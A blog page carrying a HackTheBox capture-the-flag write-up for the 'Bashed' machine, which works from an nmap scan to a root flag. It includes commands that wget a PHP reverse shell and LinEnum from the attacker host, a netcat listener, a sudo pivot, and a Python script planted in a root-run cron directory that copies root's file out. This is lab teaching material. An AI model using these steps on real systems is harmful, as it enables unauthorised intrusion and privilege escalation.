<!DOCTYPE html>
<html lang="en">
<head>
        <meta charset="utf-8" />
        <title>Random stuff - HackTheBox</title>
        <link rel="stylesheet" href="/theme/css/main.css" />
        <link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Random stuff Atom Feed" />

        <!--[if IE]>
            <script src="https://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
        <![endif]-->
</head>

<body id="index" class="home">
        <header id="banner" class="body">
                <h1><a href="/">Random stuff </a></h1>
                <nav><ul>
                    <li class="active"><a href="/category/hackthebox.html">HackTheBox</a></li>
                </ul></nav>
        </header><!-- /#banner -->

            <aside id="featured" class="body">
                <article>
                    <h1 class="entry-title"><a href="/bashed.html">Bashed</a></h1>
<footer class="post-info">
        <abbr class="published" title="2020-01-13T20:00:00+01:00">
                Published: pon 13 stycznia 2020
        </abbr>

        <address class="vcard author">
                By                         <a class="url fn" href="/author/pawel-mateja.html">Pawe≈Ç Mateja</a>
        </address>
<p>In <a href="/category/hackthebox.html">HackTheBox</a>.</p>
<p>tags: <a href="/tag/hackthebox.html">hackthebox</a> <a href="/tag/htb.html">htb</a> <a href="/tag/solution.html">solution</a> <a href="/tag/hacking.html">hacking</a> </p>
</footer><!-- /.post-info --><h1>User flag</h1>
<p>It is not really necessary to start this one with <em>nmap</em>, but it's never a bad first step</p>
<div class="highlight"><pre><span></span>root@kali:~# nmap -sS -Pn -sV <span class="m">10</span>.10.10.68
Starting Nmap <span class="m">7</span>.70 <span class="o">(</span> https://nmap.org <span class="o">)</span> at <span class="m">2020</span>-01-13 <span class="m">13</span>:20 CET
Nmap scan report <span class="k">for</span> <span class="m">10</span>.10.10.68
Host is up <span class="o">(</span><span class="m">0</span>.11s latency<span class="o">)</span>.
Not shown: <span class="m">999</span> closed ports
PORT   STATE SERVICE VERSION
<span class="m">80</span>/tcp open  http    Apache httpd <span class="m">2</span>.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in <span class="m">10</span>.24 seconds
</pre></div>


<p>As we can see, only port 80 is opened. After opening it in web browser, there is a unfinished, but already launched website. We can dig a bit through it, just to learn that it is connected to a <em>phpbash</em> project. That's nice, but we want to speed things up.</p>
<p>We can run several tools to look for cool and useful, but hidden urls. My first choice here is DirBuser.
It takes him a few minutes to find the thing we need:</p>
<div class="highlight"><pre><span></span>http://10.10.10.68/dev/phpbash.php
</pre></div>


<p>After opening that link we know that we are in the right place. It's an online bash terminal. So wy not to try to look for the first flag?</p>
<div class="highlight"><pre><span></span>$ ls /user
$ cat /home/arrexel/user.txt
</pre></div>


<p>Yup, we got it!</p>
<h1>Root flag</h1>
<p><em>phpbash</em> is nice, but doesn't provide a full terminal experience. A reverse shell is wat we need.</p>
<p>Firstly we need a place in the /var/www/html path to store it. Only the <em>upload</em> dir will do, but we need nothing more. Except of course of a php reverse shell with out IP in it's config. I've already got it on my Kali VM, served by an apache instance, so it's easy:</p>
<div class="highlight"><pre><span></span>www-data:/var/www/html/uploads# wget <span class="m">10</span>.10.14.16/shell.php
</pre></div>


<p>Now I can open netcat on my Kali, and load 10.10.10.68/upload/shell.php in my web browser.</p>
<div class="highlight"><pre><span></span>root@kali:/var/www/html# nc -v -n -l -p <span class="m">1234</span>
</pre></div>


<p>It works, so now the same thing in <em>/tmp</em> dir <em>LinEnum</em></p>
<div class="highlight"><pre><span></span><span class="nb">cd</span> /tmp
wget <span class="m">10</span>.10.14.16/LinEnum.sh
bash LinEnum.sh
</pre></div>


<p>We can see good stuff in it's output!</p>
<div class="highlight"><pre><span></span>[+] We can sudo without supplying a password!
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
</pre></div>


<p>We knew about this user already from listing the home directory. Now we can sudo it.</p>
<div class="highlight"><pre><span></span>$ sudo -u scriptmanager bash
</pre></div>


<p>Works. What next? We need something to find a point for privilege escalation. <em>pspy</em> will help us with it.</p>
<div class="highlight"><pre><span></span>pspy64
</pre></div>


<div class="highlight"><pre><span></span><span class="nt">2020</span><span class="o">/</span><span class="nt">01</span><span class="o">/</span><span class="nt">13</span> <span class="nt">05</span><span class="p">:</span><span class="nd">46</span><span class="p">:</span><span class="nd">01</span> <span class="nt">CMD</span><span class="o">:</span> <span class="nt">UID</span><span class="o">=</span><span class="nt">0</span>    <span class="nt">PID</span><span class="o">=</span><span class="nt">2297</span>   <span class="o">|</span> <span class="nt">python</span> <span class="nt">test</span><span class="p">.</span><span class="nc">py</span>
<span class="nt">2020</span><span class="o">/</span><span class="nt">01</span><span class="o">/</span><span class="nt">13</span> <span class="nt">05</span><span class="p">:</span><span class="nd">46</span><span class="p">:</span><span class="nd">01</span> <span class="nt">CMD</span><span class="o">:</span> <span class="nt">UID</span><span class="o">=</span><span class="nt">0</span>    <span class="nt">PID</span><span class="o">=</span><span class="nt">2296</span>   <span class="o">|</span> <span class="o">/</span><span class="nt">bin</span><span class="o">/</span><span class="nt">sh</span> <span class="nt">-c</span> <span class="nt">cd</span> <span class="o">/</span><span class="nt">scripts</span><span class="o">;</span> <span class="nt">for</span> <span class="nt">f</span> <span class="nt">in</span> <span class="o">*</span><span class="p">.</span><span class="nc">py</span><span class="o">;</span> <span class="nt">do</span> <span class="nt">python</span> <span class="s2">&quot;$f&quot;</span><span class="o">;</span> <span class="nt">done</span>
</pre></div>


<p>Nice, we can see, that <em>/scrips</em> dir is owned by <em>scriptmanager</em>!</p>
<p>Now we need a tiny root.txt stealing python script. It doesn't need to be fancy.</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">shutil</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="n">shutil</span><span class="o">.</span><span class="n">copy</span><span class="p">(</span><span class="s2">&quot;/root/root.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;/tmp/root.txt&quot;</span><span class="p">)</span>
<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;chmod 777 /tmp/root.txt&quot;</span><span class="p">)</span>
</pre></div>


<p>As in every step, I've served it on my Kali apache, so:</p>
<div class="highlight"><pre><span></span>$ wget <span class="m">10</span>.10.14.16/bashed/run.py

sudo -u scriptmanager cp run.py /scripts
$ cat /tmp/root.txt
</pre></div>


<p>IT'S ROOTED. It was not difficult but fun!</p>                </article>
            </aside><!-- /#featured -->
        <section id="extras" class="body">
                <div class="blogroll">
                        <h2>links</h2>
                        <ul>
                            <li><a href="http://getpelican.com/">Pelican</a></li>
                            <li><a href="http://python.org/">Python.org</a></li>
                            <li><a href="http://jinja.pocoo.org/">Jinja2</a></li>
                            <li><a href="#">You can modify those links in your config file</a></li>
                        </ul>
                </div><!-- /.blogroll -->
                <div class="social">
                        <h2>social</h2>
                        <ul>
                            <li><a href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>

                            <li><a href="#">You can add links in your config file</a></li>
                            <li><a href="#">Another social link</a></li>
                        </ul>
                </div><!-- /.social -->
        </section><!-- /#extras -->

        <footer id="contentinfo" class="body">
                <address id="about" class="vcard body">
                Proudly powered by <a href="http://getpelican.com/">Pelican</a>, which takes great advantage of <a href="http://python.org">Python</a>.
                </address><!-- /#about -->

                <p>The theme is by <a href="http://coding.smashingmagazine.com/2009/08/04/designing-a-html-5-layout-from-scratch/">Smashing Magazine</a>, thanks!</p>
        </footer><!-- /#contentinfo -->

</body>
</html>